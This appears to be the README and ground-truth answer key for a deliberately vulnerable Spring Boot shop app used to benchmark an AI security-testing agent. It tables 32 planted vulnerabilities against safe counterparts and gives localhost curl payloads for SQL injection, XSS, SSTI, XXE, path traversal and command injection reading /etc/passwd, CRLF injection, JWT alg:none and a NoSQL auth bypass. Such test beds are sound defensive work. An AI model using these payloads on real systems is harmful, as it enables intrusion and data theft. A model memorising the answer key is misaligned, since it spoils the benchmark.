# easyshop-app 漏洞清单（Ground Truth）

这是 API Sentinel 的基准测试应用，独立 Spring Boot 项目，共 **53 个评分接口** + 6 个实用/基础设施接口 + 1 个 SPA 前端。
故意留了真实可用的漏洞，**只在本地跑，千万别部署到公网/共享环境**。

## 启动

监听 `http://localhost:8089`，两种方式任选（JDK 17+）：

**方式一：直接跑打好的 jar（最快）**

```bash
cd easyshop-app
java -jar target/easyshop-1.0.0.jar        # jar 不存在就先跑一次方式二
```

**方式二：Maven 源码模式**

```bash
cd easyshop-app
mvn spring-boot:run                         # 或 ~/tools/apache-maven-3.9.16/bin/mvn spring-boot:run
```

提示：
- 依赖走的是 `~/.m2/settings.xml` 里配置的阿里云镜像（国内网络快）；换环境如果拉不到依赖，检查该配置。
- 启动日志里看不到 "Started" 是**正常的**——`application.properties` 故意设了 `logging.level.root=WARN`。只要 8089 端口能访问就是起来了。

## 数据规模

| 数据类型 | 数量 | 存储位置 |
|---|---|---|
| 用户 | 10（alice, bob, admin, charlie, diana, eve, frank, grace, henry, iris） | H2 + UserStore（内存） |
| 商品 | 15（Widget, Gadget, Gizmo, 无线耳机, 蓝牙音箱, 机械键盘...） | H2 |
| 订单 | 10（ID 1001-1010，分属不同用户） | OrderService（内存） |
| 发票 | 6（ID 2001-2006） | InvoiceService（内存） |
| 钱包 | 10（每个用户一个） | H2 |
| 优惠券 | 6（SAVE10, VIP20, NEW50, SUMMER30, TECH100, FIRST15） | CouponController（内存） |

**重置数据**：`POST /api/admin/reset`（需登录）可一键恢复所有内存 + H2 数据到初始状态，保证 benchmark 可重复。

## SPA 前端（浏览器驱动测试靶场）

访问 `http://localhost:8089/` 会加载一个 Vue 3 单文件 SPA（品牌名 **EasyShop**），包含：

### 一级导航
- **登录页** — 输入用户名即可登录（任意密码均可），设置 `SESSION_USER` Cookie
- **仪表板** — 统计卡片 + 隐藏管理面板（极小 `·` 入口，需 DOM 检查才能发现）
  - "导出所有用户数据" → `GET /api/admin/export`
  - "系统调试信息" → `GET /api/debug/config`
  - "重置数据" → `POST /api/admin/reset`
- **订单** — 列表展示 10 个订单（ID 1001-1010），点击进详情可修改数量
- **个人设置** — `POST /api/profile/update`（Mass Assignment #41）

### 二级菜单「🔧 工具」
- **👥 用户管理** — 搜索用户/商品、管理员用户列表、用户详情/公开信息、发票查询、旧版 API (v0) 入口
- **📦 商品目录** — 商品详情查询 / 安全查询
- **📁 文件管理** — 文件读取 / 日志查看（含命令注入端点）/ 文件下载
- **💰 转账中心** — 转账 / 一键结账 / 优惠券使用
- **🎨 页面渲染** — 问候(XSS) / 模板预览(SSTI) / 账户信息(CORS/Debug) / 链接跳转 / 更新资料
- **📥 数据导入** — 序列化数据导入 / 旧版仪表板链接
- **🔒 安全工具** — Tab 面板：Token验证 / URL代理 / 上传 / XML / 加密哈希 / 数据查询(NoSQL)

### 深层触发端点
- `PUT /api/orders/{id}/quantity`（#43）— 需通过订单详情页 UI 交互触发
- `POST /api/orders`（#44）— 需通过三步表单提交触发

### 实用端点（非评分）
- `GET /api/health` — 健康检查
- `GET /api/stats` — 商店统计
- `GET /api/products/list` — 商品列表（支持搜索/排序/分页）
- `GET /api/orders/user/{userId}` — 用户订单历史

## 怎么把流量导入 Burp

浏览器直接点只能测 GET 接口，POST 接口需要用 curl 或 Burp Repeater。通过 Burp 代理发请求可自动抓到 Proxy History。

```bash
BURP=http://127.0.0.1:8080
BASE=http://localhost:8089

# 登录拿 Cookie
curl -x $BURP -s -c /tmp/alice.cookie -X POST "$BASE/api/login?username=alice"
curl -x $BURP -s -c /tmp/bob.cookie   -X POST "$BASE/api/login?username=bob"
```

### GET 接口示例

```bash
curl -x $BURP -s "$BASE/api/users/search?name=x"               # #1 SQLi
curl -x $BURP -s "$BASE/api/orders/1001"                         # #3/#4 堆栈泄露+IDOR
curl -x $BURP -s -b /tmp/bob.cookie "$BASE/api/admin/users"     # #6 垂直越权
curl -x $BURP -s "$BASE/api/users/1"                             # #17 信息泄露
curl -x $BURP -s "$BASE/api/greet?name=<script>alert(1)</script>"  # #21 XSS
curl -x $BURP -s "$BASE/api/render?template=\${7*7}"             # #23 SSTI
curl -x $BURP -s "$BASE/api/files?path=../../../etc/passwd"      # #25 LFI
curl -x $BURP -s "$BASE/api/logs?file=app.log;cat%20/etc/passwd" # #45 命令注入
curl -x $BURP -s "$BASE/api/download?filename=test%0d%0aX-Injected:evil"  # #49 CRLF
curl -x $BURP -s "$BASE/api/v0/users"                            # #53 Shadow API（无认证）
```

### POST 接口示例

```bash
# #7 JWT alg:none
curl -x $BURP -s -X POST "$BASE/api/auth/token" \
  -H "Content-Type: application/json" \
  -d '{"token":"eyJhbGciOiJub25lIn0.eyJ1c2VyIjoxfQ."}'

# #11 SSRF
curl -x $BURP -s -X POST "$BASE/api/fetch-url" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8089/api/debug/config"}'

# #27 XXE
curl -x $BURP -s -X POST "$BASE/api/parse-xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# #47 NoSQL 注入（$ne 绕过认证）
curl -x $BURP -s -X POST "$BASE/api/mongo/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# #51 优惠券重放（同一优惠码可无限使用）
curl -x $BURP -s -X POST "$BASE/api/coupon/apply" \
  -H "Content-Type: application/json" \
  -d '{"code":"SAVE10","orderTotal":"100"}'
# 再发一次 → 仍然成功（漏洞）；/api/coupon/redeem 第二次会被拒绝

# #43 IDOR 修改订单（bob 改 alice 的订单）
curl -x $BURP -s -X PUT -b /tmp/bob.cookie "$BASE/api/orders/1001/quantity" \
  -H "Content-Type: application/json" \
  -d '{"quantity":999}'
```

## 漏洞对照表

`需跳层` = 只看 controller 代码看不出来，得往下追 service/DAO 层才能判断。

| # | 接口 | 类型 | 结论 | 需跳层 |
|---|---|---|---|---|
| 1 | `GET /api/users/search?name=` | SQL 注入 | **有漏洞** —— 字符串拼接查询，报错回显数据库原始错误 | 否 |
| 2 | `GET /api/products/search?name=` | SQL 注入（安全对照） | 安全 —— 参数化查询 | 否 |
| 3 | `GET /api/orders/{id}`（不存在的 id） | 堆栈跟踪泄露 | **有漏洞** —— NPE，完整 Java 堆栈返回 | 是 |
| 4 | `GET /api/orders/{id}`（别人的 id） | IDOR | **有漏洞** —— 无归属校验 | 是 |
| 5 | `GET /api/invoices/{id}` | IDOR（安全对照） | 安全 —— service 层归属校验 | 是 |
| 6 | `GET /api/admin/users` | 垂直越权 | **有漏洞** —— 只检查登录，不检查管理员角色 | 是 |
| 7 | `POST /api/auth/token` | JWT alg:none | **有漏洞** —— `"alg":"none"` 绕过签名 | 是 |
| 8 | `POST /api/auth/verify` | JWT（安全对照） | 安全 —— HS256 + 过期校验 | 是 |
| 9 | `GET /api/profile` | CORS 误配 | **有漏洞** —— `*` + `Credentials: true` | 否 |
| 10 | `GET /api/profile2` | CORS Origin 反射 | **有漏洞** —— Origin 原样反射 | 否 |
| 11 | `POST /api/fetch-url` | SSRF | **有漏洞** —— 无白名单 | 是 |
| 12 | `POST /api/fetch-external` | SSRF（安全对照） | 安全 —— 域名白名单 | 是 |
| 13 | `POST /api/upload` | 危险文件上传 | **有漏洞** —— 任意扩展名 | 否 |
| 14 | `POST /api/upload-image` | 上传（安全对照） | 安全 —— 白名单 + 随机文件名 | 否 |
| 15 | `POST /api/import` | 反序列化 | **有漏洞** —— ObjectInputStream 直接反序列化 | 否 |
| 16 | `GET /web/dashboard` | 缺失安全头 | **有漏洞** —— 无 CSP/HSTS/X-Frame-Options | 否 |
| 17 | `GET /api/users/{id}` | 敏感信息泄露 | **有漏洞** —— 返回密码哈希 + 身份证号 | 否 |
| 18 | `GET /api/users/{id}/public` | 敏感信息（安全对照） | 安全 —— 过滤后字段 | 否 |
| 19 | `GET /api/debug/config` | 调试信息泄露 | **有漏洞** —— debug:true + 内网 IP + DB 连接串 | 否 |
| 20 | `POST /api/checkout` | CSRF | **有漏洞** —— Cookie 认证，无 CSRF Token | 否 |
| 21 | `GET /api/greet?name=` | XSS 反射 | **有漏洞** —— 输入直接拼进 HTML | 否 |
| 22 | `GET /api/welcome?name=` | XSS（安全对照） | 安全 —— HTML 转义 | 否 |
| 23 | `GET /api/render?template=` | SSTI | **有漏洞** —— Freemarker 模板编译执行 | 否 |
| 24 | `GET /api/preview?template=` | SSTI（安全对照） | 安全 —— 固定模板 | 否 |
| 25 | `GET /api/files?path=` | 路径穿越 | **有漏洞** —— 路径直接拼接 | 否 |
| 26 | `GET /api/documents?path=` | 路径穿越（安全对照） | 安全 —— 路径前缀校验 | 否 |
| 27 | `POST /api/parse-xml` | XXE | **有漏洞** —— 外部实体未禁用 | 否 |
| 28 | `POST /api/parse-config` | XXE（安全对照） | 安全 —— DTD + 外部实体禁用 | 否 |
| 29 | `GET /api/products/detail?id=` | 布尔盲注 | **有漏洞** —— id 拼接进 SQL | 否 |
| 30 | `GET /api/product-info?id=` | 布尔盲注（安全对照） | 安全 —— 参数化查询 | 否 |
| 31 | `POST /api/transfer` | 竞态条件 | **有漏洞** —— 读余额 + 扣款非原子 | 是 |
| 32 | `POST /api/wallet/transfer` | 竞态条件（安全对照） | 安全 —— 原子 UPDATE WHERE | 是 |
| 33 | `POST /api/reset-token` | 不安全随机数 | **有漏洞** —— java.util.Random | 是 |
| 34 | `POST /api/password/reset` | 随机数（安全对照） | 安全 —— SecureRandom | 是 |
| 35 | `POST /api/encrypt` | 硬编码密钥 + ECB | **有漏洞** —— 密钥硬编码，ECB 模式 | 是 |
| 36 | `POST /api/seal` | 加密（安全对照） | 安全 —— 环境变量密钥 + CBC | 是 |
| 37 | `POST /api/register` | 弱密码哈希 | **有漏洞** —— MD5 无盐 | 是 |
| 38 | `POST /api/signup` | 密码哈希（安全对照） | 安全 —— BCrypt | 是 |
| 39 | `GET /api/redirect?url=` | 开放重定向 | **有漏洞** —— 无白名单校验 | 是 |
| 40 | `GET /api/goto?url=` | 重定向（安全对照） | 安全 —— host 白名单 | 是 |
| 41 | `POST /api/profile/update` | Mass Assignment | **有漏洞** —— role/admin 字段可被设置 | 是 |
| 42 | `POST /api/profile/save` | Mass Assignment（安全对照） | 安全 —— DTO 限制字段 | 是 |
| 43 | `PUT /api/orders/{id}/quantity` | IDOR 越权修改 | **有漏洞** —— 无归属校验，深层触发 | 是 |
| 44 | `POST /api/orders` | 业务逻辑 | **有漏洞** —— 无输入校验，深层触发 | 否 |
| 45 | `GET /api/logs?file=` | 命令注入 | **有漏洞** —— shell 命令拼接 | 否 |
| 46 | `GET /api/system-logs?file=` | 命令注入（安全对照） | 安全 —— 白名单 + NIO 读取 | 否 |
| 47 | `POST /api/mongo/login` | NoSQL 注入 | **有漏洞** —— `$ne` 绕过认证 | 否 |
| 48 | `POST /api/mongo/auth` | NoSQL 注入（安全对照） | 安全 —— 拒绝 `$` 操作符 | 否 |
| 49 | `GET /api/download?filename=` | CRLF 注入 | **有漏洞** —— 响应头注入 | 否 |
| 50 | `GET /api/fetch-file?filename=` | CRLF（安全对照） | 安全 —— CR/LF 过滤 | 否 |
| 51 | `POST /api/coupon/apply` | 优惠券重放 | **有漏洞** —— 无限次使用 | 否 |
| 52 | `POST /api/coupon/redeem` | 优惠券重放（安全对照） | 安全 —— 一次性标记 | 否 |
| 53 | `GET /api/v0/users` | Shadow API | **有漏洞** —— 废弃端点无认证 | 否 |

共 **32 条有漏洞、21 条安全对照**。

## 分类说明

- **需跳层**（21 条）：必须追到 service/DAO 层才能判断，检验 Agent 是否真的在用 `read_file`/`grep_repo`
- **Agent 专属逻辑漏洞**（#31-#42）：纯 HTTP 请求发现不了，必须分析源码调用链
- **浏览器深层触发**（#43-#44）：只有通过 SPA UI 交互才能触发
- **新增漏洞类型**（#45-#53）：命令注入、NoSQL 注入、CRLF、优惠券重放、Shadow API

## 备注

- #1 的数据库报错来自 H2（内存数据库），插件的 `HeuristicDetector` 按 MySQL/PostgreSQL/Oracle/SQL Server/SQLite 签名写，**大概率不命中**——专门测试 AI 层的行为判断能力。
- `application.properties` 全局开了 `server.error.include-stacktrace=always`，任何未捕获异常都会带完整堆栈。
- 项目完全没引入 Spring Security，#16 的"缺失安全头"是自然结果。
- 登录不校验密码（任意密码均可登录），这是一个隐含的认证弱点，不在评分表里。

## 完整接口清单

### 评分接口（53 个）

```
GET  /api/users/search          # #1 SQLi
GET  /api/products/search       # #2 SQLi safe
GET  /api/orders/{id}           # #3 堆栈泄露 + #4 IDOR
GET  /api/invoices/{id}         # #5 IDOR safe
GET  /api/admin/users           # #6 垂直越权
POST /api/auth/token            # #7 JWT alg:none
POST /api/auth/verify     # #8 JWT safe
GET  /api/profile               # #9 CORS *
GET  /api/profile2              # #10 CORS Origin 反射
POST /api/fetch-url             # #11 SSRF
POST /api/fetch-external        # #12 SSRF safe
POST /api/upload                # #13 危险上传
POST /api/upload-image           # #14 上传 safe
POST /api/import                # #15 反序列化
GET  /web/dashboard             # #16 缺失安全头
GET  /api/users/{id}            # #17 信息泄露
GET  /api/users/{id}/public     # #18 信息安全对照
GET  /api/debug/config          # #19 调试信息泄露
POST /api/checkout              # #20 CSRF
GET  /api/greet                 # #21 XSS
GET  /api/welcome            # #22 XSS safe
GET  /api/render                # #23 SSTI
GET  /api/preview           # #24 SSTI safe
GET  /api/files                 # #25 路径穿越
GET  /api/documents            # #26 路径穿越 safe
POST /api/parse-xml             # #27 XXE
POST /api/parse-config        # #28 XXE safe
GET  /api/products/detail       # #29 布尔盲注
GET  /api/product-info  # #30 布尔盲注 safe
POST /api/transfer              # #31 竞态条件
POST /api/wallet/transfer         # #32 竞态条件 safe
POST /api/reset-token           # #33 不安全随机数
POST /api/password/reset      # #34 随机数 safe
POST /api/encrypt               # #35 硬编码密钥+ECB
POST /api/seal          # #36 加密 safe
POST /api/register              # #37 MD5 弱哈希
POST /api/signup         # #38 BCrypt safe
GET  /api/redirect              # #39 开放重定向
GET  /api/goto         # #40 重定向 safe
POST /api/profile/update        # #41 Mass Assignment
POST /api/profile/save   # #42 Mass Assignment safe
PUT  /api/orders/{id}/quantity  # #43 IDOR 修改
POST /api/orders                # #44 业务逻辑
GET  /api/logs                  # #45 命令注入
GET  /api/system-logs             # #46 命令注入 safe
POST /api/mongo/login           # #47 NoSQL 注入
POST /api/mongo/auth      # #48 NoSQL safe
GET  /api/download              # #49 CRLF 注入
GET  /api/fetch-file         # #50 CRLF safe
POST /api/coupon/apply          # #51 优惠券重放
POST /api/coupon/redeem     # #52 优惠券 safe
GET  /api/v0/users              # #53 Shadow API
GET  /api/v0/users/{id}         # #53 Shadow API（同组）
GET  /api/v0/debug              # #53 Shadow API（同组）
```

### 实用/基础设施接口（7 个，非评分）

```
POST /api/login                 # 登录（设置 SESSION_USER Cookie）
GET  /api/admin/secrets         # ★ Feature 测试端点（严格校验 SESSION_USER 值必须是真实用户 id）
POST /api/admin/reset           # 重置所有数据到初始状态
POST /api/admin/export          # 导出全部用户（同 #6 垂直越权）
GET  /api/health                # 健康检查
GET  /api/stats                 # 商店统计
GET  /api/products/list         # 商品列表（搜索/排序/分页）
GET  /api/orders/user/{userId}  # 用户订单历史
```

### ★ Feature 测试端点：`/api/admin/secrets`（不在评分范围）

这个端点是**专门为了测试 API Sentinel 的"主动询问账号"功能**而加入的，不纳入 GROUND_TRUTH 评分。

**与 `/api/admin/users` 的关键区别**：

| 端点 | Cookie 校验方式 | 任意值绕过? | 测试用途 |
|---|---|---|---|
| `/api/admin/users` | 只校验 SESSION_USER 存在 | ✅ 是（任意值都 200） | 测"cookie 只校验存在"漏洞 |
| `/api/admin/secrets` | 严格校验 SESSION_USER 必须是 1-10 的真实用户 id | ❌ 否 | **测试 ask_user → browser_login → 持久化链路** |

**鉴权行为**（响应故意简短，不给绕过提示）：
- 无 cookie → 401 `{"error":"not authenticated"}`
- cookie 非数字 → 401 `{"error":"not authenticated"}`（同上，无区分）
- cookie 是不存在的 id（如 999）→ 401 `{"error":"not authenticated"}`（同上，无区分）
- cookie 是真实 id（1-10）→ 200，返回内部配置（API key、JWT secret、数据库连接串等）

**为什么 agent 必然走 ask_user 流程**：
1. agent 看到这个端点返回 401
2. 所有绕过尝试（任意值、枚举、SQL 注入）都得到完全相同的 401 → 无法从错误信息推断正确值
3. 没办法，只能按提示词规则 ask_user 问你要账号
4. 你提供 `admin` + 任意密码（登录不校验密码）
5. agent 调 `browser_login(strategy=auto, remember=true)`
6. 拿到真实 `SESSION_USER=3`，调 `/api/admin/secrets` 成功
7. profile 自动保存到 `~/.api-sentinel/login-profiles.json` 的 `auto-localhost`

**登录后可继续挖掘的漏洞**（agent 自然会做）：
- 响应里包含硬编码的 API key、JWT secret、AWS 凭据 → **敏感信息泄露**
- 用 alice (id=1) 登录也能看到完整配置 → **垂直越权**（接口没做角色判断）


